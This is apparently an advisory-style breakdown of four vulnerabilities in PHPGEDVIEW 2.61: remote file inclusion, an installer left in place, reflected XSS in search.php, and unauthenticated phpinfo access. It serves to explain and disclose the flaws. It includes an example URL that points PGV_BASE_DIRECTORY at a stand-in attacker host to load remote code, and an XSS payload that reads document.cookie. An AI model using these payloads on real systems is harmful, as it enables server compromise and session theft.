The provided content details multiple vulnerabilities in PHPGEDVIEW 2.61, including PHP code injection, insecure configuration, XSS, and information disclosure.

**1) PHP Code Injection**

*   **Root Cause:** The application uses a variable `$PGV_BASE_DIRECTORY` to include files, and this variable is controllable by the user via HTTP GET parameters. Specifically, the vulnerable files are `authentication_index.php`, `functions.php`, and `config_gedcom.php`.
*   **Weaknesses:** Unsanitized user input is used in a `require` statement.
*   **Impact:** Remote attackers can include arbitrary PHP code from a remote server, leading to arbitrary code execution on the target server.
*   **Attack Vector:** HTTP GET requests by providing a malicious URL to the `PGV_BASE_DIRECTORY` parameter (e.g. `http://target/phpgedview_folder/authentication_index.php?PGV_BASE_DIRECTORY=http://attacker/`).
*   **Attacker Capabilities:** The attacker needs a publicly accessible web server to host the malicious PHP code.

**2) Insecure Configuration**

*   **Root Cause:** The `editconfig.php` file, which is used for initial configuration, is not deleted after installation.
*   **Weaknesses:** Leaving the configuration script accessible after installation.
*   **Impact:** An attacker can re-run the configuration script, potentially gaining administrative access by changing the administrator password.
*  **Attack Vector:** Accessing `editconfig.php` via a web browser.
*   **Attacker Capabilities:** The attacker needs to know the location of `editconfig.php`.

**3) Cross-Site Scripting (XSS)**

*   **Root Cause:** The application does not properly sanitize user input in the `search.php` script when handling `firstname`, `lastname`, `place`, and `year` parameters, specifically when the `action` parameter is set to `soundex`.
*  **Weaknesses**: Unsanitized user input is reflected back in the HTML code.
*   **Impact:** An attacker can inject malicious JavaScript code into the web page, which will be executed in the context of the victim's browser, potentially leading to session hijacking or other malicious actions.
*  **Attack Vector:** HTTP GET request by providing a script in the vulnerable input parameter (e.g. `<http://localhost/phpgedview/search.php?action=soundex&firstname=>">&lt;script&gt;alert(document.cookie)&lt;/script&gt;`).
*   **Attacker Capabilities:** The attacker needs to trick a user into visiting a crafted URL.

**4) Information Disclosure**

*   **Root Cause:** The `admin.php` script allows access to `phpinfo()` output via the `action=phpinfo` parameter, even if the user is not authenticated.
*   **Weaknesses:** Improper access control to sensitive system information.
*   **Impact:** An attacker can gain access to potentially sensitive information about the server's configuration, potentially aiding in further attacks.
*  **Attack Vector:** Accessing `admin.php?action=phpinfo` via a web browser.
*   **Attacker Capabilities:** The attacker needs to know the location of the admin.php file
